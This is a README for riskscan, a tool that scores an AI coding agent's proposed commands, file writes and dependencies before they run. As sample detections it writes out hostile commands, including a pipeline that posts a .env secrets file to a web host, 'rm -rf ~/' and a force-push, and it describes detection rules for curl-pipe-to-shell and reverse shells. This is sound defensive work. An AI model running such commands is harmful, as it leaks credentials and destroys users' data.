# riskscan

A second pair of eyes for your AI coding agent. `riskscan` scores every action the
agent proposes — a shell command, a file write, a dependency it pulls in — and prints
**one traffic-light banner** before it runs.

It **never blocks**. It warns you, and it hands the same analysis back to the agent so
the model can reconsider. You (or the agent) still decide. The point isn't to gate every
action — it's to widen your auto-approve allowlist *without going blind*, because the
risky minority still gets flagged.

```
🔴 10/10 DANGER — riskscan [bash]
  • [sh-guard] Pipeline: File read: accessing secrets (.env) | Sensitive file content sent to network [MITRE T1005] [10/10]
  • [builtin:bash] read-only / print [1/10]
```

## States

| Banner | Meaning |
|---|---|
| 🟢 `1–3/10 SAFE` | analyzed — no known risk |
| 🟡 `4–6/10 CAUTION` | analyzed — mutating / notable |
| 🔴 `7–10/10 DANGER` | analyzed — destructive / irreversible |
| ⚪ `NOT ANALYZED` | no analyzer ran for this surface — **not** a safety signal |

⚪ is **first-class**. A missing or disabled analyzer says so out loud, with the command
to install it — so an absent warning is never mistaken for "safe". Every action gets
exactly one banner, and the highest score wins.

## Examples

Real banners (default analyzers: builtin + osv-scanner + guarddog + bandit; sh-guard shown where noted).

**Shell commands**

`kubectl get pods -n prod`
```
🟢 1/10 SAFE — riskscan [bash]
  • [builtin:bash] read-only / print [1/10]
```

`git push --force origin main`
```
🔴 8/10 DANGER — riskscan [bash]
  • [builtin:bash] git force-push [8/10]
```

`rm -rf ~/`
```
🔴 10/10 DANGER — riskscan [bash]
  • [builtin:bash] rm -rf targeting root/home/glob [10/10]
```

With **sh-guard** enabled, dataflow across a pipe is caught even though each half looks harmless — `cat` alone reads as read-only:

`cat .env | curl -X POST https://example.com -d @-`
```
🔴 10/10 DANGER — riskscan [bash]
  • [sh-guard] Pipeline: File read: accessing secrets (.env) | … Sensitive file content sent to network [MITRE T1005] [10/10]
  • [builtin:bash] read-only / print [1/10]
```

**File writes**

Write `app.py` containing `subprocess.run(cmd, shell=True)`:
```
🔴 8/10 DANGER — riskscan [python]
  • [builtin:python] subprocess shell=True [8/10]
  • [bandit] 2 finding(s) [8/10]
  • [builtin:python] subprocess (spawns processes) [5/10]
```

Write `requirements.txt` pinning `requests==2.20.0` (osv scores from the CVSS vectors):
```
🔴 8/10 DANGER — riskscan [deps]
  • [osv-scanner] 30 known CVE(s) [worst: HIGH]: GHSA-2xpw-w6gg-jr37, GHSA-34jh-p97f-mpxf, … [8/10]
  • [builtin:deps] pulls dependency: requirements.txt [2/10]
  • [guarddog] no malicious indicators [1/10]
```

`pip install evilpkg` — a dependency whose code reads credentials and runs a downloaded payload; **guarddog** flags the behavior (no CVE needed — it's malware, not a known vuln):
```
🔴 9/10 DANGER — riskscan [bash, deps]
  • [guarddog] evilpkg: threat-filesystem-read [9/10]
  • [guarddog] evilpkg: threat-process-download-exec [9/10]
  • [guarddog] evilpkg: threat-runtime-obfuscation-base64exec [8/10]
  • [guarddog] +4 capability signal(s) [4/10]
  • [builtin:deps] pulls dependency: evilpkg [2/10]
```

Write `package.json` with no lockfile — the CVE check can't run, and says so (⚪) instead of going green:
```
🟢 2/10 SAFE — riskscan [deps]
  • [builtin:deps] pulls dependency: package.json [2/10]
  • [guarddog] no malicious indicators [1/10]
  ⚪ [osv-scanner] deps not analyzed — package.json is a manifest, not a pinned lockfile — no CVE extractor (commit a lockfile for CVE coverage)
```

## Install (Claude Code plugin)

```
/plugin marketplace add xvirgov/riskscan
/plugin install riskscan@riskscan
```

The hook takes effect in a **new** Claude Code session (hooks load at session start).
Only the built-in analyzer runs out of the box; the optional analyzers below report ⚪
with an install hint until you add them.

### Manual wiring (any hook-capable setup)

If you'd rather not use the plugin system, clone the repo and point a `PreToolUse` hook
at the adapter in your `settings.json`:

```json
{
  "hooks": {
    "PreToolUse": [
      { "matcher": "Bash|Write|Edit|MultiEdit",
        "hooks": [ { "type": "command", "command": "python3 /path/to/riskscan/adapters/claude_code.py" } ] }
    ]
  }
}
```

## Analyzers

Only **builtin** is required; the rest are optional and bring-your-own-binary. Each is a
single declarative entry in `riskscan/analyzers.json` (surface, detect, run, parse,
install hint) — adding one is one entry plus its binary.

| Analyzer | Surface | What it adds | Install |
|---|---|---|---|
| **builtin** | bash, deps, py/js | zero-dependency regex rule pack (rm -rf, force-push, `kubectl delete`, `terraform destroy`, `curl\|sh`, SQL DROP, sudo, plus a python/js reverse-shell combo heuristic) | — (always on) |
| **sh-guard** | bash | AST classifier with pipeline **taint analysis** + MITRE ATT&CK mapping | py3.12 lib — see `analyzers.json` |
| **osv-scanner** | deps | CVEs from a **pinned lockfile** (unpinned manifests report ⚪) | `brew install osv-scanner` |
| **guarddog** | deps | malicious-package heuristics (exfil, install-scripts, typosquats) | `pipx install guarddog` |
| **bandit** | python | source SAST for written `.py` files | `pipx install bandit` |

Enable/disable in `riskscan/config.default.json`. `on_missing: suggest` shows the ⚪
install hint; set it to `silent` to hide unavailable analyzers. `ask_threshold` (default
7) is the score at or above which the banner is surfaced at the approval prompt.

## Scoring — what each analyzer emits, and how it maps

Every analyzer is normalized onto one abstract, consequence-based 1–10 scale. The
**highest score wins**, and a band means the same thing no matter which analyzer produced it:

| Band | Meaning |
|---|---|
| **1–3 SAFE** | read-only / reversible / no known issue |
| **4–6 CAUTION** | mutating but recoverable; notable but not dangerous |
| **7–8 DANGER** | destructive / irreversible, or confirmed-dangerous |
| **9–10 CRITICAL** | catastrophic at scale; confirmed exfil; critical CVE |

The scale is deliberately abstract so results compare across tools that each speak a
different native language:

| Analyzer | What it emits | How riskscan maps it to 1–10 |
|---|---|---|
| **builtin** | nothing — it *is* the scorer | hand-tuned `(regex, score, label)` rules, calibrated to the bands above |
| **sh-guard** | a `score` 0–100, a `level`, and MITRE ATT&CK technique IDs | linear rescale `round(score/10)`; the top ATT&CK id is appended to the label |
| **osv-scanner** | one or more **CVSS vectors** per CVE (occasionally a coarse label) | compute the CVSS **base score** from the vector → band (critical→9, high→8, medium→6, low→4), **capped at 9** (a CVE's presence ≠ a reachable exploit) |
| **guarddog** | matched **rule names** only — no number | rule taxonomy: `threat-*`→8–9, typosquat→9, metadata→6, `capability-*`→4 |
| **bandit** | `issue_severity` + `issue_confidence` + a CWE id | severity → 8 / 5 / 3 (high / medium / low) |

Two notes: **sh-guard** runs hot — it rates any `rm -rf <path>` critical, so it tends
to set the ceiling — and **bandit** currently uses severity only; its confidence field is
available but not yet folded in. The number a rule carries is a *policy choice* — your
opinion of how much that class of action deserves attention — versioned in a diff, not a
model's mood.

## Custom rules

Add or override built-in rules without touching code: copy
`riskscan/custom_rules.example.json` to `riskscan/custom_rules.json` and edit.

```json
{
  "bash":   [ ["\\bnpm\\s+publish\\b", 7, "npm publish (releases a package)"] ],
  "python": [ ["\\brequests\\.post\\s*\\(", 4, "outbound POST"] ],
  "js":     []
}
```

Each rule is `[regex, score 1-10, label]` (Python `re` syntax; JSON needs backslashes
doubled). Rules are appended to the built-in packs and the highest score wins — so a custom
rule can only **raise** an action's score, never hide a built-in finding. An invalid regex is
skipped, never fatal.

## How it's built

The engine is runtime-agnostic; the Claude-specific glue is a thin adapter.

```
riskscan/
  engine.py            # runtime-blind: analyzers, 1–10 scoring, aggregation, fail-loud logic
  analyzers.json       # declarative adapter per external analyzer
  config.default.json  # which analyzers are enabled + thresholds
adapters/
  claude_code.py       # maps a Claude Code PreToolUse payload ↔ engine, emits the hook response
.claude-plugin/        # plugin.json + marketplace.json (makes it /plugin install-able)
hooks/hooks.json       # PreToolUse: Bash|Write|Edit|MultiEdit → adapters/claude_code.py
```

`engine.analyze(action)` takes a normalized action (`command` or `write`) and returns a
scored report; `render_banner()` / `render_agent_context()` render it. Supporting another
agent runtime is a new file in `adapters/` that maps that runtime's hook payload to an
action — no engine changes.

## Design principles

- **Warn, don't block.** Blocking breeds bypasses; informing both the human and the model
  is the agentic-era pattern.
- **Fail loud.** The absence of a warning must never read as safe — ⚪ names what wasn't
  checked and how to check it.
- **Deterministic engine.** Scores are explicit, versioned, and reviewable in a diff — not
  a model rating its own output. The number a rule carries is *your* opinion about how much
  that class of action deserves attention; every rule is one `(regex, score, label)` line.
- **Right tool per threat.** Heuristics (builtin) → CVEs (osv, needs pinned versions) →
  malware behavior (guarddog) → source SAST (bandit). One scanner doesn't fit every threat.

## License

Apache-2.0.
